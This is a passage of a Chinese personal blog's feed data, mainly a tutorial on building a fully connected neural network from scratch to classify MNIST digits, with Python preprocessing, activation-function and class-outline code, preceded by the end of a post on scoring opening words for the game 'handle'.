class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">clock_t</span> clockStart;</span><br><span class="line">    clockStart = clock();</span><br><span class="line">    <span class="comment">// ... sth.</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;time length: &quot;</span> &lt;&lt; CheckTime(clockStart, clock()) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windows下g++编译，<code>depth=0</code>跑完<code>16</code>个大约是<code>12s</code>，<code>depth=1</code>跑完<code>4</code>个大约是<code>32s</code>，我大概是花了4~5h跑完所有数据</p><p><del>以及千万不要让测速度的脚本能覆盖结果，像我直接把之前算完的给覆盖了，全部重来</del></p><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>经过排序发现</p><center><b>研经铸史</b></center><br><p>是handle的最优开头，且在depth=1的情况下E=14.8701，以ΔE=0.03的巨大差值（笑）和第二名拉开距离</p><h2 id="结果统计"><a href="#结果统计" class="headerlink" title="结果统计"></a>结果统计</h2><p>基本全部正常的词在d0的E都在10以上，少数如“可口可乐”，d0E=6.55192，这样的词拉低了整体下限，整体d0E分布如下</p><img src="/images/handle_d0.png"/><p>对于前d0E排名top100的词进行d1E的计算和排序，分布如下</p><img src="/images/handle_d1.png"/><p>日不动了，再见 UwU</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全连接神经网络[神经网络入门]</title>
      <link href="2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8%5D/"/>
      <url>2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8%5D/</url>
      
        <content type="html"><![CDATA[<p>全连接神经网络识别MNIST手写数字集，AI中的HelloWorld</p><img src="/images/FCNN_cover.png"/><span id="more"></span><!--toc--><h1 id="全连接神经网络-神经网络入门"><a href="#全连接神经网络-神经网络入门" class="headerlink" title="全连接神经网络[神经网络入门]"></a>全连接神经网络[神经网络入门]</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在的AI库诸如<code>TensorFlow</code>,<code>Keras</code>,<code>Pytorch</code>等，都可以快捷方便地在几行代码之内就构建好一个网络模型，然后开始训练等后续的事情，但把这些库当成黑盒来用的话，反正我是晚上睡不着觉的</p><p>虽然说全连接神经网络（Fully Connected Neural Network，以下简称<code>FCNN</code>）是人造神经网络（Artificial Neural Network，以下简称<code>ANN</code>）的入门，但在这之前也可以先做一些线性回归，逻辑回归，以及逻辑回归的多分类来加深理解和降低入门的难度，这些也是我之前做过的东西，但因为写的比较烂而且本身也不难，就不放出来了</p><p>因为在这篇文章之前只有<a href="https://kyriota.com/2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise[AI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99]/">这篇讲对抗扰动的文章</a>是有关机器学习的，所以我也尽量在这篇文章中细🔒一些概念和理解，最好能让吃瓜的也能吃的舒服</p><h2 id="ANN概述"><a href="#ANN概述" class="headerlink" title="ANN概述"></a>ANN概述</h2><p>对于神经网络的认识和理解，强烈推荐<a href="https://www.bilibili.com/video/BV1bx411M7Zx">3b1b的系列视频</a>（共四集），从概念到公式一条龙服务，讲的肯定比我清楚和直观</p><p>对于系统学习机器学习的相关知识（包括线性回归，逻辑回归等），可以看<a href="https://www.bilibili.com/video/BV164411b7dx">吴恩达系列视频</a>（这个就有点多了）</p><h3 id="ANN是什么"><a href="#ANN是什么" class="headerlink" title="ANN是什么"></a>ANN是什么</h3><p>神经网络不是玄学，全是数学，具体点，我目前做的东西涉及到的概念其实也就：偏导数，线性代数，链式法则，都是大一就学过的东西</p><p>本文会讲解如何训练一个识别MNIST手写数字集的神经网络，MNIST手写数字集是包含了数万张28x28的手写数字图像的数据集（以下简称MNIST，但其实还有MNIST衣物图片的数据集等），每个数字对应了一个<code>lable</code>，指明图像对应的数字，如下图就是一份数据集中包含的数据样本，而他对应的<code>lable</code>是<code>1</code></p><img src="/images/FCNN_sample.png"/><p>抽象的说，神经网络就是一个函数（这样思考对于CTF中构造对抗样本很有帮助），你给他一个输入，他给你一个输出</p><p>记这个网络为<code>h</code>（hypothesis），这个输入的<code>1</code>的数字图片样本记为<code>X</code>，则我们所期待的是模型输出一个向量来描述各个数字的概率<code>h(X)=&#123;0,1,0,0,0,0,0,0,0,0&#125;</code>（从左到右是0至9的概率，意思模型认为图片是<code>1</code>的概率是100%，是除了<code>1</code>以外的数字的概率是0%，这样的格式称为<code>OneHot Encoding</code>，好处是便于矩阵计算）</p><h3 id="ANN为何表现出智能"><a href="#ANN为何表现出智能" class="headerlink" title="ANN为何表现出智能"></a>ANN为何表现出智能</h3><p>在3b1b的视频中，他在Part1的5:40提到</p><blockquote><p>Why it’s even reasonable to expect a layered structure like this to behave intelligently</p></blockquote><p>他给出了一个比较让人容易接受的理解，即在多层次的结构中，上一层处理出图像的一些细微特征，然后在下一层对这些特征进行组合</p><p>但显然真正的网络并不是这样工作的，在3b1b的视频中，他在Part2的14:25展示了一些神经网络的权重可视化，而直观上看可视化后的权重，基本就是稍微有序一些的噪音，所以关于这个网络怎么能够得到我们所期待的功能那是这个网络自己的事情（“你已经是一个成熟的神经网络了”），只要他找到了一个还算不错的局部最优解，那其实就已经足够了</p><p>总结一下就是，把ANN看成一个数学模型就行，千万别想玄乎了，在生物上的神经科学发展完全之前，对“智能”的定义都会是比较模糊的，我们就算感觉AI好像拥有智能，那也只不过是一个结构比较复杂的函数</p><h2 id="一个神经元"><a href="#一个神经元" class="headerlink" title="一个神经元"></a>一个神经元</h2><p>我很喜欢的一句话：简单的规则可以组成复杂的系统，这句话在神经网络中同样适用，先理解单个神经元的工作原理，才能理解他们组成的网络是如何工作的，在后续对神经网络的数学推导中，我也会先对单个神经元组成的网络推导，然后再推广开来，方便我这样🧠不太好的人理解（这也是3b1b的做法，太照顾人了</p><p>以下内容均以下图所示网络为例</p><img src="/images/FCNN_cover.png"/><p>首先明确，FCNN是一个多层次结构，包含了输入层，隐藏层，输出层</p><p>单个神经元的机理很简单，观察隐藏层<code>Dense #2</code>中的第0个神经元，它也是一个函数，记作<code>Z[2][0]</code>，其中，<code>Z</code>表示神经元函数本身，<code>[2]</code>表示其在第二层，<code>[0]</code>表示其是第一个神经元，由图可知，它的输入是其上一层的所有神经元的输出，它的输出会传递到下一层的每一个神经元，这也是“全连接”的直接体现（你要是看到图里面他没有全连接起来，那多半是我抠图的时候魔棒不小心扣没了）</p><p>而神经元之间的信号传递其实是一个线性的过程，类比<code>y=kx+b</code>，即</p><center><code>Z[2][0]=∑w[2][i][0]*Z[1][i], i for i in range(0,6)</code></center><br><center><b>WARNING: 这个式子是错的，但暂时先这样理解</b></center><br><p>在<code>w[2][i][0]</code>中，<code>w</code>表示权重（类比k，具体点，可以把w相成是神经元之间连接的线），<code>[2]</code>表示该权重是第一层与第二层之间的，<code>[i]</code>表示上一层中的第i个，<code>[0]</code>表示下一层中的第0个（表达上有点繁琐，但并不难理解）</p><h3 id="偏置"><a href="#偏置" class="headerlink" title="偏置"></a>偏置</h3><p>显然相对于<code>y=kx+b</code>，还少了其中的<code>b</code>，为了补上<code>b</code>，在FCNN中，会给除了输出层之外的每一层补上一个神经元作为<code>bias</code>，又称偏置，这是一个特殊的神经元，其不接受任何输入，然后对下一层中的每一个神经元都稳定输出一个<code>+1</code>，然后下一层中偏置对每个神经元影响的大小再由对应的权重来调整，具体的连接方式如图白色部分所示</p><img src="/images/FCNN_bias.png"/><p>现在可以试着举一个例子了，比如考虑如下情况<code>?</code>的值</p><img src="/images/FCNN_neuronExample.png"/><p>而问号的下面那个神经元的值，是<code>-0.3+0.05+(-0.12)+(-0.4)=-0.77</code></p><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>如果直接把线性计算得到的<code>Z</code>作为该神经元的输出传递到下一层，那么得到的网络也将是一个线性网络，这样的网络不管是十层还是百层都只能相当于一层</p><p>为了得到一个非线性的网络，在除了输入层之外的每一层都会在<code>Z</code>的基础上再套一个激活函数<code>A</code>，激活函数以<code>Z</code>作为输入，即神经元的输出其实是<code>A(Z)</code></p><p>常见的激活函数有：<code>ReLU</code>，<code>tanh</code>，<code>sigmoid</code>等，就不附图了搜一下就有（懒</p><p>那么，更新一以下之前提到的<code>Z</code>的式子，应该是</p><center><code>Z[2][0]=∑w[2][i][0]*A[2][i], i for i in range(0,6)</code></center><br><p>（由于偏置作为一个神经元包含进上一层的输出，就不在式子中单独加上一个<code>b</code>了）</p><p>对于输出层，激活函数则要根据具体问题来选择，例如MNIST手写数字集是分类0至9的数字，有多个类别，则会选用<code>softMax</code>作为输出的激活函数，其特征是累加之和为1，这符合多分类的问题的期望解，更具体的东西，比如<code>softMax</code>的求偏导，具体公式之类的，就不赘述了（懒</p><h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>以下梳理一下数据传递的整体流程</p><ul><li>输入的数据为<code>X</code>（输入层），直接输入到隐藏层</li><li>隐藏层第一层的输出为<code>A1(Z1)</code>，其中<code>Z1=w1*X</code></li><li>隐藏层第二层的输出为<code>A2(Z2)</code>，其中<code>Z2=w2*A1</code></li><li>……以此类推</li></ul><h2 id="训练过程"><a href="#训练过程" class="headerlink" title="训练过程"></a>训练过程</h2><p>主要就是梯度下降，一句话，求梯度，然后往负梯度的方向行进，可以求得一个函数的极小值，但是：为什么梯度下降这个方法可以训练一个模型，具体是怎么implement的，大概就到了大多数人的认知边界了/滑稽。考虑梯度下降之前，先了解求梯度的应用对象：损失函数</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>loss/cost function，记作<code>J</code>，是描述模型的预测结果对于真实值的差异的函数，举个例子，给了模型<code>1</code>的图片输入，模型的输出却是<code>&#123;0.5,0.5,0,0,0,0,0,0,0,0&#125;</code>，这与应该出现的结果产生了偏差，要描述这个偏差，可以直接求实际输出向量和期望的输出向量之差的L2范数，即求他们的均方误差，记期望的向量为<code>y</code>，实际输出的向量为<code>h(x)</code>，则<code>J=∑((y-h(x))*(y-h(x)))</code>，此处乘积为对应元素相乘，则计算可得loss大约是0.71</p><p>通过损失函数，就可以量化表示模型预测结果的准确度了，而大多数时候会使用较复杂度更高的带<code>log</code>的交叉熵函数作为损失函数，公式如下</p><img src="/images/FCNN_crossEntropy.png"/><p>看起来比较复杂，但画一个抛物线来表示均方误差函数，再画一下log的图像理解交叉熵函数就差不多了</p><p>交叉熵好处都有啥：收敛快，局部最优点少，知道就行</p><h3 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h3><blockquote><p>除了单纯的梯度下降，还有如momentum，RmsProp，Adam等优化算法，但本文使用<code>mini-batch</code>梯度下降法来训练</p></blockquote><p>首先明确常量：训练时用的样本<code>X</code>是固定不变的，样本对应的<code>lable</code>，或记作<code>y</code>，也是不变的，唯一变化的就只有网络中间连接各个层级的权重<code>w</code>（偏置<code>b</code>包含在权重里边，因为偏置的具体大小由连接的权重控制），以及因为权重变化而跟着一起变化的预测结果，还有中间量<code>A</code>和<code>Z</code>，一切变化都来自于权重<code>w</code>的变化</p><p>问题现在则应该理解成：找到合适的<code>w</code>，使得<code>J</code>最小</p><p>具体点，就是：对<code>J(w)</code>求关于<code>w</code>的偏导，获取<code>J(w)</code>的梯度，然后更新权重<code>w</code>为<code>w-=rate*dw</code>，其中，<code>dw</code>为<code>J(w)</code>的梯度，<code>rate</code>为学习率，控制了一次下降多少，学习率过低会导致训练缓慢，学习率过高则容易各种<code>NAN</code>或者反复横跳无法收敛，需要一定的试错成本来确定合适的学习率，一般在10e-6到1之间</p><p>由于这部分内容网上资源挺多的，就不赘述了（懒</p><p>（后面会有反向传播的推导，这才是重点</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>以上就是一些重要的前置（因为我怕把理解和代码融为一体会导致逻辑混乱），以下内容就正式开始涉及码代码了，坐好扶稳</p><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>在<code>kaggle</code>下载到他们提供的MNIST手写数字数据集后，不能上手即用</p><ul><li>颜色范围0至255这个区间太大了，应该压缩到0至1，整体除以255</li><li>再者数据的分布也不自然，应该套一个标准分数公式，处理成正态分布</li></ul><p>关于应该对单个像素做处理还是对整体做处理（例如求均值，是对每一个像素求出对应像素位置的均值，还是整体处理，直接求出所有像素的均值），在本例中应该整体处理更好</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理数据集</span></span><br><span class="line">dsTrain = pd.read_csv(<span class="string">r&#x27;mnist.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># 原本kaggle上的测试集是没有lable分类的，在kaggle的leaderBoard上找到正确的lable后pd.concat到原本的测试集</span></span><br><span class="line">dsTest = pd.read_csv(<span class="string">r&#x27;mnist_test.csv&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 获取训练集的特征</span></span><br><span class="line"><span class="string">ds_std = np.std(dsTrain.iloc[:, 1:], axis = 0) # 训练集标准差</span></span><br><span class="line"><span class="string">ds_mean = np.mean(dsTrain.iloc[:, 1:], axis = 0) # 训练集均值</span></span><br><span class="line"><span class="string"># 标准化数据，此方法是针对训练集中的同一位置的像素，效果一般，故未采用</span></span><br><span class="line"><span class="string">for i in range(len(ds.T) - 1):</span></span><br><span class="line"><span class="string">    if ds_std[i] != 0: # 边角上就很可能出现标准差为0的像素</span></span><br><span class="line"><span class="string">        dsR.iloc[:, i + 1] = (dsR.iloc[:, i + 1] - ds_mean[i]) / ds_std[i] # 标准分数公式，基本呈正态分布</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">trainX = dsTrain.iloc[:, <span class="number">1</span>:]</span><br><span class="line">trainy = dsTrain.iloc[:, :<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 排列测试集，方便在测试之后绘图</span></span><br><span class="line">testX = pd.concat([dsTest[dsTest[<span class="string">&quot;label&quot;</span>] == i].iloc[:, <span class="number">1</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line">testy = pd.concat([dsTest[dsTest[<span class="string">&quot;label&quot;</span>] == i].iloc[:, :<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line"><span class="comment"># 归一化</span></span><br><span class="line">trainX = trainX / <span class="number">255</span></span><br><span class="line">testX = testX / <span class="number">255</span></span><br><span class="line"><span class="comment"># 获取训练集特征</span></span><br><span class="line">mean = np.mean(np.array(trainX).ravel())  <span class="comment"># 训练集均值</span></span><br><span class="line">std = np.std(np.array(trainX).ravel())  <span class="comment"># 训练集标准差</span></span><br><span class="line">trainX = (trainX - mean) / std  <span class="comment"># 标准分数公式，基本呈正态分布</span></span><br><span class="line">testX = (testX - mean) / std  <span class="comment"># 用训练集的特征处理测试集数据，才能证明模型是否能识别陌生数据</span></span><br></pre></td></tr></table></figure>    </div></div><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><p>之前提到了一堆数学函数，实现起来主要就是<code>softMax</code>和<code>sigmoid</code>会比较耽误时间</p><p><code>leaky ReLU</code>是<code>ReLU</code>的实验性变种，通常用于在实验的时候避免因为使用<code>ReLU</code>导致大量神经元死亡，梯度消失的问题</p><blockquote><p>后记：之前的SoftMax偏导求错了，其应该是一个方阵，但估计是因为一开始写的时候为了方便，没有理解清楚就去找了一段标称是derivative of softmax的代码，结果他求的只是在<code>i=j</code>情况下的的softmax<br>虽然事后证明这一谬误只影响了我一个百分点的正确率，但给我后来复用这段代码来找对于输入向量的梯度，并用自己找到的梯度和<code>tensorflow</code>中<code>gradientTape</code>求得的梯度比较时怀疑人生</p></blockquote><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># d_func 是func的导数/偏导 derivative</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">relu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_relu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lrelu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># leaky relu</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0.1</span> * x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_lrelu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (x &gt; <span class="number">0</span>) * <span class="number">0.9</span> + <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">softMax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.array(np.exp(x) / np.<span class="built_in">sum</span>(np.exp(x), axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_softMax</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = softMax(x)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">            r.append([])</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">                r[-<span class="number">1</span>].append(-x[i][j] * x[i][k] <span class="keyword">if</span> j != k <span class="keyword">else</span> x[i][j] * (<span class="number">1</span> - x[i][k]))</span><br><span class="line">    <span class="keyword">return</span> np.array(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    x_ravel = np.array(x).ravel()</span><br><span class="line">    length = <span class="built_in">len</span>(x_ravel)</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> x_ravel[i] &gt;= <span class="number">0</span>:</span><br><span class="line">            x_ravel[i] = <span class="built_in">min</span>(<span class="number">19</span>, x_ravel[i])  <span class="comment"># 限制范围，精度不够，np.exp()也易爆</span></span><br><span class="line">            y.append(<span class="number">1.0</span> / (<span class="number">1</span> + np.exp(-x_ravel[i])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x_ravel[i] = <span class="built_in">max</span>(-<span class="number">744</span>, x_ravel[i])</span><br><span class="line">            y.append(np.exp(x_ravel[i]) / (np.exp(x_ravel[i]) + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> np.array(y).reshape(x.shape)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sigmoid(x) * (<span class="number">1</span> - sigmoid(x))</span><br></pre></td></tr></table></figure>    </div></div><h3 id="数据处理函数"><a href="#数据处理函数" class="headerlink" title="数据处理函数"></a>数据处理函数</h3><p>之前提到的<code>OneHot</code>和插入<code>bias</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OneHot</span>(<span class="params">length, width, y</span>):</span></span><br><span class="line">    <span class="comment"># OneHot encoding</span></span><br><span class="line">    y = np.array(y).ravel()</span><br><span class="line">    r = np.zeros((length, width))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        r[i][<span class="built_in">int</span>(y[i])] = <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddBias</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># 在第0列插入全为1的列</span></span><br><span class="line">    x = np.matrix(x)</span><br><span class="line">    <span class="keyword">return</span> np.c_[np.ones((x.shape[<span class="number">0</span>], <span class="number">1</span>)), x]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveBias</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># 去掉第一列</span></span><br><span class="line">    <span class="keyword">return</span> np.matrix(x)[:, <span class="number">1</span>:]</span><br></pre></td></tr></table></figure>    </div></div><h3 id="FCNN-class"><a href="#FCNN-class" class="headerlink" title="FCNN class"></a>FCNN class</h3><p>以下开始填充<code>FCNN</code>类</p><p>明确一下类中的基本函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span>(<span class="params">self, unitNum</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">PrepareBatch</span>(<span class="params">self, X, y, batchSize=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">fit</span>(<span class="params">self, epoch, rate</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">gradDes</span>(<span class="params">self, rate</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">backProp</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">forwardProp</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">ClrTempResult</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">predict</span>(<span class="params">self, X, y</span>)</span></span><br></pre></td></tr></table></figure><p>明确一些概念</p><ul><li>batchSize：如果整个过完一遍训练集中的数据才更新一次权重，则更新速度过慢，故将数据集拆分为多批来处理，batchSize就是一批数据有多少份样本</li><li>epoch：总共要过几遍完整的数据，所以权重的更新次数就是<code>epoch*N/batchSize</code>，其中<code>N</code>是训练集样本总量</li><li>backward Propagation：后向传播，指通过梯度来调整权重的过程<strong>（重点）</strong></li><li>forward Propagation：前向传播，指传入样本后得到输出结果的过程</li></ul><p>以上概念虽然名词是在本文中第一次出现，但结合上文都不难理解</p><p>而训练过程中还有一个称作<code>DropOut</code>的优化方法，指的是在训练中随机地掐死一些神经元，前向传播的时候不经过他们，后向传播的时候也不更新他们，从而使得模型更具鲁棒性，也可以有效避免模型过拟合（过拟合：模型泛化不好，训练集和测试集的识别准确率相差过大），关于<code>DropOut</code>为什么能增强模型鲁棒性、避免过拟合的说法有很多，建议自己搜（懒</p><p>然后我们肯定希望模型可以保存下来，至少训练出来的权重得能保存吧，不然每次都得重来一遍</p><p>所以再补几个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDropOut</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">SaveParameters</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">LoadParameters</span>(<span class="params">self</span>)</span></span><br></pre></td></tr></table></figure><p>其中<code>backProp</code>的公式推导这个重点问题放到下面的模块来说，这里则再提一些小一点的问题</p><ul><li><p>权重的初始化方法</p><p>  选择错误的权重初始化方法会导致梯度消失等严重问题，可能导致训练根本无法开始，由于我选择的是<code>ReLU</code>作为隐藏层的激活函数，使用了<code>He initialization</code>，具体为什么这样的初始化对<code>ReLU</code>会更友好则没有深入探究</p></li><li><p>正则项</p><p>  有一种防止过拟合的方法是：在损失函数中加入有关权重<code>w</code>的二次项，这样在<code>dw</code>中就体现在每次更新权重时权重都会自减一点点</p></li><li><p>DropOut的具体实现</p><p>  创建与<code>w</code>同样size的矩阵，将本轮中掐死的神经元的行与列置<code>0</code>，其他置<code>1</code>，传递时把<code>w</code>换成<code>np.multiply(w,dropOut)</code>即可</p></li></ul><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 